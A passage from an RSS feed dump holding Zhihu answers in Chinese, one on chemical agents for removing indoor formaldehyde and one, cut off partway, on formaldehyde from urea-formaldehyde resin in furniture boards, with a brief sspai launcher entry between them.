data-pid=\"cjbTcVeI\">所幸的是，从化学的角度来说，甲醛确实是可以通过物理、化学等方法进行清除的。我们看看都有哪些化学物质，可以帮助我们净化空气，有针对性的去除甲醛。</p>\n<p data-pid=\"fvNOW5LL\">一、氨丁三醇</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b2d9a39c054cc9b2d29074bde42c2a3d_720w.png?rss\" data-caption=\"给氨丁三醇的分子结构亮个相吧\" data-size=\"normal\" data-rawwidth=\"184\" data-rawheight=\"210\" data-watermark=\"watermark\" data-original-src=\"v2-b2d9a39c054cc9b2d29074bde42c2a3d\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"F2SdXtKF\">这是一种常用的除臭剂，它在去除体臭（丙酸、壬烯醛、异戊酸等）方面的效果非常好。其中的原理是氨丁三醇与醛反应生成亚胺或噁唑烷。</p>\n<p data-pid=\"uZgNsdle\">噁唑烷是一种比较常用的杀菌剂，化妆品、涂料里反正要用，多一点正好。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8db68c83937146f9c915f57b81192e8f_720w.png?rss\" data-caption=\"体臭的化学来源，氨丁三醇可以帮你搞定\" data-size=\"normal\" data-rawwidth=\"554\" data-rawheight=\"327\" data-watermark=\"watermark\" data-original-src=\"v2-8db68c83937146f9c915f57b81192e8f\" data-watermark-src=\"v2-3d3e7f0aaa0b914fe6159c8ab5d3e24c\" data-private-watermark-src=\"v2-bc088f38ff66f8f63f679148f4d4e22b\"></p>\n<p data-pid=\"zf87F5LP\">2012年美国批准的一篇专利“US 8.236,263 B2”，其中提到，氨丁三醇在吸收甲醛方面也很给力。如下图，使用了尿素、乙酰乙酰胺、乙醇胺、硫酸氢钠等作为参比样，氨丁三醇的效果是最好的，吸收后的甲醛浓度低于0.05ppm。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8eb4627c7242eaf422954b63d0849e3d_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"554\" data-rawheight=\"469\" data-watermark=\"watermark\" data-original-src=\"v2-8eb4627c7242eaf422954b63d0849e3d\" data-watermark-src=\"v2-0e5d0d639a422cbe6896533263d04f6b\" data-private-watermark-src=\"v2-62cf31f3b5d2f8f8551e553c3c321fad\"></p>\n<p data-pid=\"AYjjkrBA\">目前，氨丁三醇已经被加入到洗衣凝珠、增香产品、宠物护理中，添加量极低，增加不了多少成本。除此以外，它还有可能被加入一些建筑涂料中，刷在墙上，冲在第一线吸收甲醛。</p>\n<p data-pid=\"otdsz_sQ\">如果你不清楚自己家里用的涂料或去除甲醛产品里是否添加了氨丁三醇，可以去日化店找到一些增香产品，看看成分表，如果里面也有氨丁三醇的话，可以勉强拿过来用。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d0c94c71818c4a965df0fc6142189e58_720w.png?rss\" data-caption=\"氨丁三醇已经用于化妆品\" data-size=\"normal\" data-rawwidth=\"554\" data-rawheight=\"436\" data-watermark=\"watermark\" data-original-src=\"v2-d0c94c71818c4a965df0fc6142189e58\" data-watermark-src=\"v2-42236cc6068ebb35b8cf40247ce26a38\" data-private-watermark-src=\"v2-cfadf0783573ad0fb57287050ba1746b\"></p>\n<p data-pid=\"_eXazCy2\">二、乙烯脲（咪唑啉酮）</p>\n<p data-pid=\"UJLwki1u\">咪唑啉酮的结构如下，可以看到它有两个活性氢原子，如果将其换成两个甲基封端，就是大名鼎鼎的万能溶剂DMI（1,3-二甲基咪唑啉酮）。 </p>\n<p><img src=\"https://pic1.zhimg.com/v2-8748bf1c6892f6a6eebe65e91e349264_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"227\" data-rawheight=\"222\" data-watermark=\"watermark\" data-original-src=\"v2-8748bf1c6892f6a6eebe65e91e349264\" data-watermark-src=\"v2-e4e6d2b36515fc460f5311e9d4a52471\" data-private-watermark-src=\"v2-0d423ebc3c24247c033d6fde4b1d8ad9\"></p>\n<p data-pid=\"f30ucV03\">而咪唑啉酮在200度左右可以与甲醛反应生成二羟甲基亚乙基脲，这是一种纺织除皱剂，反应机理如下图。</p>\n<p data-pid=\"tajxc4gD\">这个反应条件有点苛刻，谁能在家里到处放酒精炉子，就为了去除甲醛呢？但在适当催化剂的作用下，下述反应在70度左右就可能发生。</p>\n<p data-pid=\"NnA7iXs3\">所以，目前也有人在将咪唑啉酮添加到纺织品、涂料和胶黏剂中，作为一种甲醛清除剂。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6975195be193e502e790e8784508ac48_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"412\" data-rawheight=\"88\" data-watermark=\"watermark\" data-original-src=\"v2-6975195be193e502e790e8784508ac48\" data-watermark-src=\"v2-ce07a875bf72489054c87f5eff6dd3d9\" data-private-watermark-src=\"v2-912c3236cee768246c7c7cd58dff3e74\"></p>\n<p data-pid=\"j11Q0UOe\"> 三、氧化石墨烯</p>\n<p data-pid=\"NHE4dz2l\">2021年，日本北海道研究机构林产品研究所的一篇论文《用少量氧化石墨烯降低脲醛树脂的甲醛释放量》中提到，在脲醛树脂中添加 0.20 wt%氧化石墨烯时，可以减少81.5%的甲醛排放。机理似乎是氧化石墨烯表面的活性氧原子与甲醛分子里的氢原子反应，生成水。</p>\n<p data-pid=\"wk9yl00y\">然而，增加氧化石墨烯的添加量，效果并不会更好，反而会起到反作用，专家们预测可能是因为过高的添加量影响了材料的pH值，导致脲醛树脂更快的固化。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-932216db2b26fbb0f3234d9fe6e45d41_720w.png?rss\" data-caption=\"含有 (a) 0.10、0.15 wt%、(b) 0.20 wt% 和 (c) 0.40、1.0、1.9 wt% 氧化石墨烯 的脲醛树脂的甲醛排放示意图。上放大图像表示氧化石墨烯表面的氧原子与甲醛的氢原子的相互作用。\" data-size=\"normal\" data-rawwidth=\"386\" data-rawheight=\"286\" data-watermark=\"watermark\" data-original-src=\"v2-932216db2b26fbb0f3234d9fe6e45d41\" data-watermark-src=\"v2-ddfc82a229f679716d812f8ff9dfbe95\" data-private-watermark-src=\"v2-e8525774d88d04449af9d3ccdc974efc\"></p>\n<p data-pid=\"K7Wfs-Ef\">四、氨基酸</p>\n<p data-pid=\"kGYw-VCw\">在2019年的论文《甲醛如何与氨基酸反应》中，作者将不同类型的氨基酸与甲醛反应，观察其形成的不同稳定性的羟甲基化、环化、交联或歧化产物。他们发现，在测试的常见氨基酸中，半胱氨酸反应最有效，形成稳定的噻唑烷，与赖氨酸的反应效率较低。</p>\n<p data-pid=\"sfLjeg3m\">这篇论文可能更多的为了观察甲醛对生物体的影响，但是否可以从另一个角度去研究一下，用氨基酸作为甲醛的吸收物呢？</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b7698e867bad4bd98ada8e1d4cc07dbc_720w.png?rss\" data-caption=\"半胱氨酸和甲醛之间的反应。\" data-size=\"normal\" data-rawwidth=\"554\" data-rawheight=\"670\" data-watermark=\"watermark\" data-original-src=\"v2-b7698e867bad4bd98ada8e1d4cc07dbc\" data-watermark-src=\"v2-1133d96670a532841329cb29ffb6d861\" data-private-watermark-src=\"v2-750b5bda3852c12251d695d460d055ca\"></p>\n<p data-pid=\"3Hno8242\">五、光触媒</p>\n<p data-pid=\"xB-v7BkN\">这种原理已经比较成熟，大致原理如下：</p>\n<p data-pid=\"1Zdu39Pq\">当TiO 2被光照射时，在块状颗粒中产生电子和空穴对。在产生空穴的同时，电子获得能量以穿过带隙从价带离开到导带。价带中的空穴具有很强的氧化能力，因此，它与吸附的氢氧根离子反应生成羟基自由基。羟基自由基进攻甲醛分子，将其分解成二氧化碳和水。</p>\n<p data-pid=\"BjJvgUlG\">但是，这个反应需要紫外光的助力，我们常见的日光经过了臭氧层，到达地球表面后只有较少的紫外线。因此在光触媒应用方面存在限制，有人指出可以加上一个紫外灯，但对人体是有一定危害的。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5cfee4cbe00effcdbb92516769dd6077_720w.png?rss\" data-caption=\"光触媒的作用机理\" data-size=\"normal\" data-rawwidth=\"554\" data-rawheight=\"141\" data-watermark=\"watermark\" data-original-src=\"v2-5cfee4cbe00effcdbb92516769dd6077\" data-watermark-src=\"v2-d492129f0a8a25e425706694bf179159\" data-private-watermark-src=\"v2-d0dafd6782abaa68812d02499a3ef88f\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-51e4987db02ff00438f68cd11a9f1c4f_720w.png?rss\" data-caption=\"具体反应式，羟基自由基进攻甲醛分子，将其分解成二氧化碳和水。\" data-size=\"normal\" data-rawwidth=\"367\" data-rawheight=\"115\" data-watermark=\"watermark\" data-original-src=\"v2-51e4987db02ff00438f68cd11a9f1c4f\" data-watermark-src=\"v2-6f300543f9467bf4456dce755cc13a62\" data-private-watermark-src=\"v2-08f7a45b8357ee04cea4fc9b8f9c0d98\"></p>\n<p data-pid=\"xJJYQcVl\">六、活性炭</p>\n<p data-pid=\"2atwxbxe\">活性炭是最常用的去除甲醛的方法，它就是一个吸附原理。从化学的角度来说，活性炭更容易吸收较大的其他VOC分子，比如苯等芳香族，吸收甲醛倒是一个“赠品”了。</p>\n<p data-pid=\"dmIBjG_8\">也有很多商家展示活性炭的效果，如下图。姑且不论他们的检测方法是否合理，他们检测的究竟是甲醛还是VOC，至少都没有发现活性炭能够比光吹风有好几个数量级的效果优势，所以我更愿意相信活性炭是一种安慰剂。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e1328fde2a5c6adfc189165f3077a3b9_720w.png?rss\" data-caption=\"某国外商家做的活性炭的效果，蓝色是活性炭，红色是只通风。有一定的效果，但降低排放水平仍然处于同一个数量级。\" data-size=\"normal\" data-rawwidth=\"497\" data-rawheight=\"405\" data-watermark=\"watermark\" data-original-src=\"v2-e1328fde2a5c6adfc189165f3077a3b9\" data-watermark-src=\"v2-f151e01127bc4571a7fe8679007fdebe\" data-private-watermark-src=\"v2-969b93ae1ea2fc83f2332383686e0c27\"></p>\n<p data-pid=\"uh9dJRZm\">总结一下：</p>\n<p data-pid=\"gyvJHc3P\">1， 通风、放置绿植仍然是较好的去除甲醛的方法。</p>\n<p data-pid=\"x3OIHSgk\">2， 化学方法去除甲醛是可行的，存在氨丁三醇、咪唑啉酮等比较成熟的可以有效去除甲醛的化学物质。这些化学物质很有可能已经在市面上的一些除甲醛产品中得到了比较好的应用，但笔者对市面产品的配方不太了解，即使了解也不方便在此泄露商业机密。</p>\n<p data-pid=\"22R2kaxB\">3， 关注最新的化学进展，存在氧化石墨烯、氨基酸等未来的吸收甲醛明日之星，成本控制可能是最大的问题。</p>\n<p data-pid=\"PKAyRNR_\">4， 光触媒是另一种很理想的去除甲醛方式，但使用方式比较受限。</p>\n<p data-pid=\"nQpjgUf2\">5， 活性炭基本上等同于安慰剂。</p>\n<p data-pid=\"tq-Rf3l-\">6， 最后，对化学工程师和立志用化学改变世界的年轻人们寄予厚望，希望他们的智慧将很多还存在于书面上的想法落实到反应釜和超市陈列的消费品里，生产出能够改善我们生活的化学品。</p>\n<p data-pid=\"RUzEnBRA\">参考阅读：</p>\n<p data-pid=\"gQNOkCog\">1，Abatement of formaldehyde with photocatalytic and catalytic oxidation: a review</p>\n<p data-pid=\"uoVXoisU\">Vipin Soni, Varun Goel, Paramvir Singh and Alok Garg</p>\n<p data-pid=\"B_ZkneMA\">From the journal International Journal of Chemical Reactor Engineering</p>\n<p data-pid=\"vYQR5hIF\"><a href=\"http://link.zhihu.com/?target=https%3A//doi.org/10.1515/ijcre-2020-0003\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">doi.org/10.1515/ijcre-2</span><span class=\"invisible\">020-0003</span><span class=\"ellipsis\"></span></a></p>\n<p data-pid=\"lm34-T_X\">2，<a href=\"http://link.zhihu.com/?target=https%3A//patentimages.storage.googleapis.com/1c/6e/0d/28c8dbd38a4e3c/US8236263.pdf\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">patentimages.storage.googleapis.com</span><span class=\"invisible\">/1c/6e/0d/28c8dbd38a4e3c/US8236263.pdf</span><span class=\"ellipsis\"></span></a></p>\n<p data-pid=\"mbhvKCS9\">3，《室内空气质量检测与控制》，2013年化学工业出版社，刘艳华</p>\n<p data-pid=\"r076nvj0\">4，Reduction of formaldehyde emission from urea-formaldehyde resin with a small quantity of graphene oxide</p>\n<p data-pid=\"pyrjPBTh\">Kazuki Saitoa, Yasushi Hirabayashib and Shinya YamanakaORCID logo*a </p>\n<p data-pid=\"LaMtrLOr\">aDivision of Applied Sciences, Muroran Institute of Technology, Mizumoto-cho 27-1, Muroran 050-8585, Japan. E-mail: syama@mmm.muroran-it.ac.jp </p>\n<p data-pid=\"41v9Mt4l\">bForest Products Research Institute, Hokkaido Research Organization, Nishikagura 1-10, Asahikawa 071-0198, Japan</p>\n<p data-pid=\"k_DT4h0f\"><a href=\"http://link.zhihu.com/?target=https%3A//pubs.rsc.org/en/content/articlehtml/2021/ra/d1ra06717f\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">pubs.rsc.org/en/content</span><span class=\"invisible\">/articlehtml/2021/ra/d1ra06717f</span><span class=\"ellipsis\"></span></a></p>\n<p data-pid=\"R_EtNaAk\">5， A method of chemical aftertreatment for the reduction of free formaldehyde release of a durable flame retardant finished cotton fabric, Saima Saleem</p>\n<p data-pid=\"hUFgXAmE\">6， Wood: Adhesives, A.H. Conner, M.S.H. Bhuiyan, in Reference Module in Materials Science and Materials Engineering, 2017</p>\n<p data-pid=\"whnuy3NY\">7，Abatement of formaldehyde with photocatalytic and catalytic oxidation: a review</p>\n<p data-pid=\"dQEF_QV1\">Vipin Soni, Varun Goel, Paramvir Singh and Alok Garg</p>\n<p data-pid=\"SeQ_Gpdy\">From the journal International Journal of Chemical Reactor Engineering</p>\n<p data-pid=\"dCbY80JW\"><a href=\"http://link.zhihu.com/?target=https%3A//doi.org/10.1515/ijcre-2020-0003\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">doi.org/10.1515/ijcre-2</span><span class=\"invisible\">020-0003</span><span class=\"ellipsis\"></span></a></p>\n<p data-pid=\"T1fXqYNV\">8，How formaldehyde reacts with amino acids</p>\n<p data-pid=\"vRzHdca8\">Jos J. A. G. Kamps, Richard J. Hopkinson, Christopher J. Schofield &amp; Timothy D. W. Claridge </p>\n<p data-pid=\"TCOdG6yx\">Communications Chemistry</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/lu-chao-15-51?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">鲁超</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/520420693/answer/2382899046?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">7 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/509108731?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">可能一不小心闻了一口甲醛，怎么补救？</a><br><a href=\"http://www.zhihu.com/question/446839068?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么现在装修材料的甲醛以及室内污染这么多？</a><br>\n","link":"http://www.zhihu.com/question/520420693/answer/2382899046?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"价值 15 美元的第三方 Android 启动器，究竟好用在哪里？","date":"2022-03-10 08:06:22","description":"跳出「应用抽屉」的囹圄，同时能够在手势操作和快捷功能上让人眼前一亮的启动器，Niagara Launcher 或许是最好的选择了。<a href=\"https://sspai.com/post/71818\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71818"},{"title":"甲醛重灾区只存在于家具板材吗？","date":"2022-03-10 07:30:03","description":"\n<p data-pid=\"3y-dsNjA\">作为一个跟家具装修打交道十多年的从业者，我比大部分人都害怕甲醛的危害，不过相反的是我并不担心我家以及客户家的甲醛超标。没有缘由，因为你如果花点时间对甲醛研究点功课，要不了多久你就能明白，甲醛问题甚至比感冒还容易搞清楚原因。</p>\n<p data-pid=\"lmQUhz4q\">虽然很多东西都有甲醛，</p>\n<h3><b>但是是只有家具板材里的甲醛是最值得关注的。</b></h3>\n<p data-pid=\"ZkoUUzL_\"><b>而且当下，家具板材里的甲醛也已经成为过去式了。</b></p>\n<p data-pid=\"wDCrrgJf\">一个一个来剖析，为什么家具板材里的甲醛最值得关注？</p>\n<p data-pid=\"4YuRYMKn\">就得说到工业用胶的发展问题。</p>\n<h2><b>甲醛的源起</b></h2>\n<p data-pid=\"D24hP5Fz\">以前甲醛的可怕来自于未知的恐惧，感觉生活中哪里都有甲醛，地板，家具，墙漆，甚至很多儿童产品都有甲醛。实际上，我跟客户聊甲醛的时候说过这些你都不担心，真正只需要担心一个东西，<b>脲醛树脂</b>。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-17f5945ffba8478b6979b562e18381b6_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"700\" data-rawheight=\"525\" data-watermark=\"original\" data-original-src=\"v2-17f5945ffba8478b6979b562e18381b6\" data-watermark-src=\"v2-c11ac88aefe2be26aefa51d4aeba98df\" data-private-watermark-src=\"v2-1d1137b65068a7455de43684b9fb3dc3\"></p>\n<p data-pid=\"RUi8ouK8\">脲醛树脂才是我觉得真正可怕的东西，它是用尿素和甲醛合成的用来把实木颗粒，木粉，木薄片粘接起来的胶黏剂。合成的树脂其实没毒，但是还有很多没互相合成完全的甲醛，以及就在材料里留下来了，称之为游离甲醛，也就是今天的主角。他可怕之处在于，它释放的周期长，随机性大，难以捉摸。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0b263664263ee3554eb0492c25073105_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1437\" data-rawheight=\"1313\" data-watermark=\"original\" data-original-src=\"v2-0b263664263ee3554eb0492c25073105\" data-watermark-src=\"v2-e1766b1be9f7393fbd6473d49c14f838\" data-private-watermark-src=\"v2-db770884685784c90a9aba3b6c78862c\"></p>\n<p data-pid=\"bGu2_gkn\">为什么要说到脲醛树脂？先分享几个数据，让大家熟悉一下它。</p>\n<blockquote data-pid=\"DBG08ri6\">1，2015年，中国甲醛年产量达2500万吨，这几年可能有增长，预计3000万吨。</blockquote>\n<p data-pid=\"BTolylGV\">生产甲醛很正常，毕竟是化工原料，很多场景和工业生产用得到，它只是不适合用在室内而已，本身是便宜又实惠的工业原料。</p>\n<blockquote data-pid=\"cFKXJx6p\">\n<i>2，甲醛产量中超过65%应用于合成树脂，主要指的是三醛（脲醛树脂，酚醛树脂，三聚氰胺甲醛树脂），其中55%用于脲醛树脂，酚醛树脂和三聚氰胺甲醛树脂分别占5%，5.5%左右。</i><br><i>人造板行业，脲醛树脂的用量超过80%。</i>\n</blockquote>\n<p data-pid=\"d2kGP6Oj\">意味着生产的甲醛将近40%都用来做脲醛树脂了，脲醛树脂用来干嘛呢？目前主要用来做人造板，以及油漆底漆。实木颗粒板，密度板，多层板等等，而且室内主要是使用脲醛树脂胶（听着就离谱，甲醛释放最严重的反而用在室内，真相是脲醛树脂不适合室外，防水能力和耐气候性都较弱）。</p>\n<p data-pid=\"klQfhiQo\">有人可能要问了，那些高端品牌呢？进口品牌呢？</p>\n<p data-pid=\"DyLmtkiE\">是的，他们也用，全世界都用。</p>\n<blockquote data-pid=\"9abl-1dm\"><i>3，2000年前，日本80%胶合板，100%刨花板；德国75%刨花板，英国100%刨花板都是使用脲醛树脂。</i></blockquote>\n<p data-pid=\"2feC30MP\">现在大家广为好评的爱X板，即饰面实木颗粒板，最新的产品也同样还是脲醛树脂，依然是有甲醛释放的人造板。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-adbe9a514ad4b15b11118ef617160a35_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"807\" data-rawheight=\"877\" data-watermark=\"original\" data-original-src=\"v2-adbe9a514ad4b15b11118ef617160a35\" data-watermark-src=\"v2-0c83d2c79d5af165d555526b34145565\" data-private-watermark-src=\"v2-51579678a985a8d118206d9676ffb0bd\"></p>\n<h2><b>甲醛的“胜利”</b></h2>\n<p data-pid=\"EZppR6jv\">正所谓擒贼先擒王，聊甲醛就先聊核心问题，脲醛树脂浑身是毛病，还威胁人类健康，为何反而被全球的人都认可，获得木材工业的完美胜利呢？</p>\n<p data-pid=\"S6Q1EWO5\">不就是胶吗，那么多种胶，为什么非要用脲醛树脂？</p>\n<p data-pid=\"n_OL3ln9\"><b>便宜，唯一的原因，</b>而且请记住这个便宜，后面要考。</p>\n<p data-pid=\"ggv-Tm9j\">而且还不够好用，脲醛树脂怕水，有很好的吸水性，甚至吸水后会分解已经合成好的脲醛树脂，大量释放甲醛，所以遇到人造板泡水，要注意甲醛安全。</p>\n<p data-pid=\"6srTy21F\">好的胶确实多，哪怕是传统三醛里的酚醛树脂，除了颜色略深，还不会有过多甲醛释放。但是现实情况就是，其他胶水都太贵了，至少对于厂家来说是太重要了。</p>\n<p data-pid=\"WKOh9jct\">脲醛树脂，大概4000一吨，酚醛树脂大概15000一吨。哪怕三聚氰胺甲醛树脂，得先用三份尿素合成一份三聚氰胺后再与甲醛反应，价格也得12000一吨。而现在市面说到的真正无醛板使用的MDI胶大概22000一吨，而且还是现在国产的价格，以前用进口MDI的时候更贵。</p>\n<p data-pid=\"4IpmZLRX\">作为传统三醛中最便宜的胶，脲醛树脂拥有不可撼动的地位，反映到板材的成本来算，每立方脲醛树脂板材的施胶的材料成本比MDI板材的成本就低了1500元左右（以刨花板10%的施胶量来算），每张1.2*2.4板子成本就低了70元左右，别看着小小的70元，很多国产的低端板材的出厂价可能都不到70元。</p>\n<p data-pid=\"n_OIE1el\">一条大型生产线年产量达到万吨级别，胶是不可能随便改的，牵涉到太多生产线的调整了。国外情况也一样，脲醛树脂作为目前全球还依然是出厂的人造板用胶的主力，哪怕你用了300一平的展开面积的价格买来的进口爱X板材，每平米板材也是大概率用的还是成本不到5块钱的有甲醛的脲醛树脂而不是25块钱成本的无醛MDI，人家倒不是没有，定向刨花板就是PMDI，但那是另一个产品线了，有醛的低成本都能高价卖出去，何必非得卖无醛呢。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1337fd60b5ccbc62b28e74106be7e116_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"790\" data-rawheight=\"450\" data-watermark=\"original\" data-original-src=\"v2-1337fd60b5ccbc62b28e74106be7e116\" data-watermark-src=\"v2-4542d337779661e6c1c0e0c34afa01fa\" data-private-watermark-src=\"v2-91d426016e113811458d9c456c91fd4f\"></p>\n<p data-pid=\"xZsQkH7-\">所以动辄四五倍，甚至六七倍的原料成本确实让工厂很难下定决心去换成别的材料，更何况，脲醛树脂的合成材料是尿素，这在中国也有极其强大的供应能力，能帮助人造板厂商轻松得扩张规模，加大产量。</p>\n<p data-pid=\"O2IovrM2\">中国从2000年1000多万立方米的人造板产量，到2019年达到了3亿立方米的产量，10年将近30倍的增量确实离不开丰富的原材料的支撑。</p>\n<p><br></p>\n<h2><b>甲醛的“进化”</b></h2>\n<p data-pid=\"9_nJx-vs\">随着需求增大，工厂也加大产能，感觉一切欣欣向荣，反而国内厂商在这里折戟沉沙了，大量的粗放增长导致甲醛释放的问题漠不关心，让口碑和品质更好一些的进口品牌占得人造板高端产品的地位。</p>\n<p data-pid=\"x-3ROl5S\">当然做为高端进口人造板的代表，也并不是完全的智商税，他们的甲醛释放确实是低的，所以至少是有值得学习的地方。</p>\n<p data-pid=\"hRHrr5mh\">脲醛树脂的甲醛释放的控制要做到足够优秀的程度，这里面需要一系列的“微操”。本着要把脲醛树脂做到底的信念，打死不能换高价无醛胶的决心，全世界所有的人造板工厂有段时间都在潜心做一件事，<b>改性脲醛树脂</b>。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ce414516721f66ab9ba3578b27033f9c_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3300\" data-rawheight=\"3380\" data-watermark=\"original\" data-original-src=\"v2-ce414516721f66ab9ba3578b27033f9c\" data-watermark-src=\"v2-eb7c652159192de15bd61e271e0d41a3\" data-private-watermark-src=\"v2-ff74590e0eb080a24d6f80c0b024ccb5\"></p>\n<p data-pid=\"UUuWRABr\">知网一搜能找到大量的改性的研究报告，改性的目的有很多，最热门的还属是怎么<b>降低甲醛释放</b>，同时顺便能解决一些防水差，固化不稳定等等老毛病就更好了。现在运用了各种各样的新技术新工艺，加入氯化铵固化剂，调节ph值，加入气态氨与游离甲醛发生反应，喷洒尿素溶液分解出氨离子与甲醛反应等等操作，或多或少都能降低甲醛的释放。</p>\n<p data-pid=\"3vSp8jQV\">在我看来，这些八成都是属于无谓的挣扎，意味着非脲醛树脂不用了，一条路走到黑，就像给一个杀人犯做各种道德教育，人格培养，可能会有好转，但它依然是个杀人犯啊，在未来的生活中依然存在大量的不确定性。</p>\n<p data-pid=\"tD0cOz7N\">我经常听到进口的或者国产大品牌的板材，哪怕同一家品牌也会出现有的高有的低，甚至超标，让品牌方也无法解释得清。需要分析的原因很多，我觉得首先最大可能是<b>板材贮放期的长短，</b>这个很多人都能理解，买家具就买展厅样品，时间久了就没味道了，就是这个理。</p>\n<blockquote data-pid=\"bOuvE1Ac\">“用氨处理后的刨花板其甲醛释放量首先显著降低，历经一段时间后，发现刨花板的甲醛释放能力在某种程度上稍有回升，但是肯定低于原理未处理时的水平，这就是所谓的回升滞后现象。经过氨处理后的刨花板贮放三个月以后，不同种类的板材甲醛释放量降低率大约为57%~71%”<br>-----------摘自高等院校木材科学与工程教程《刨花板制造学》</blockquote>\n<p data-pid=\"U4rQgMT_\">就是说甲醛释放并非是个线性关系，如果你用了半年内生产的板材（而且大概率用的是一个月的新板，这个东西囤起来仓储库存，资金压力都是事，大厂通常都是生产出来了就拉走了）你都无法判断你的板材还在哪个释放期，所以你根本无法判断甲醛的释放高低的问题，可能你放了两月入住的时候，刚好在回升滞后的阶段，赶上了释放的小高峰。</p>\n<p data-pid=\"gpf27bCK\">进口品牌在这方面就有优势了啊，毕竟是进口的，从海上就得飘个把月，而且那海上高温高湿的环境，就最适合游离甲醛的释放了。所以通常买到的爱X板，只要不是“国内代工”的进口产品，通常经历了整个周期，到国内使用怎么都过了半年了，最后加工安装，客户家里再放几个月，大半年了，这样的甲醛释放情况确实更加理想，甲醛测试成绩势必就比国内的好了。</p>\n<p data-pid=\"lOp8QBKf\">而其他的，比如其他因素的封边影响，或者改性脲醛树脂的水平等等，制板技术上我不认为和目前国产大厂的技术有很大的区别。</p>\n<p data-pid=\"zMxo3wOB\">为什么我觉得不大，接着继续看数据。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3e03844ce383cff986cf8b5427af9467_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2288\" data-rawheight=\"2104\" data-watermark=\"original\" data-original-src=\"v2-3e03844ce383cff986cf8b5427af9467\" data-watermark-src=\"v2-b4a62ac87a6447e9a019b5849666d64a\" data-private-watermark-src=\"v2-34b02412cbe4c78f352d4e37e622c582\"></p>\n<p data-pid=\"Pxw4ULFy\">我们知道德国&amp;奥地利的爱X人造板确实很出名，而且出口量也很大，仅次于加拿大，毕竟加拿大要供整个美国。而中国出口量很小，才1%，18万吨，很低很低，中国基本是自产自销了，走不出国门，让很多人觉得中国产品低端，不环保，让国外看不上。而德国产品好，环保，远销全球。</p>\n<p data-pid=\"YhQtzR38\">接着看数据。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8cf4792366671aee5ae4828cba3afd37_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2284\" data-rawheight=\"2120\" data-watermark=\"original\" data-original-src=\"v2-8cf4792366671aee5ae4828cba3afd37\" data-watermark-src=\"v2-419c75139396c424535d9a2df381a1f2\" data-private-watermark-src=\"v2-89478dcbc9fe1eb2dc365ad61d0fc718\"></p>\n<p data-pid=\"m4PpTKLS\">换一张图，<b>同年</b>的胶合板出口量，全球第一，高达37%！而且有意思的是德国&amp;奥地利也是主要从中国进口胶合板。对于这样的结论很多人就不理解了，都是人造板，都是大量使用脲醛树脂的人造板（胶合板80%以上都是使用脲醛树脂）。为何跟刨花板的情况完全相反呢？</p>\n<p><img src=\"https://pic3.zhimg.com/v2-cd57858f5b700645fb3307252394a1b0_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1276\" data-rawheight=\"1532\" data-watermark=\"original\" data-original-src=\"v2-cd57858f5b700645fb3307252394a1b0\" data-watermark-src=\"v2-836c8547c4a020c72d702a9575a50b4e\" data-private-watermark-src=\"v2-667da45c8ef2be4e1838bfe6e1ccd752\"></p>\n<p><br></p>\n<p data-pid=\"mfl6z5YI\">首先德国进口的板材肯定是要符合他们国内的环保标准的，至少证明中国产的人造板并不是低端不环保的，同样能满足所谓发达国家的环保标准。</p>\n<p data-pid=\"0-lHh1mt\">或许这就是品牌的力量吧~~~很多人宁愿更加相信德国&amp;奥地利生产的更好，只是他们也需要一些低端的胶合板，所以才从中国进口。而刨花板他们能自给自足，就不需要中国的低端刨花板了。</p>\n<p 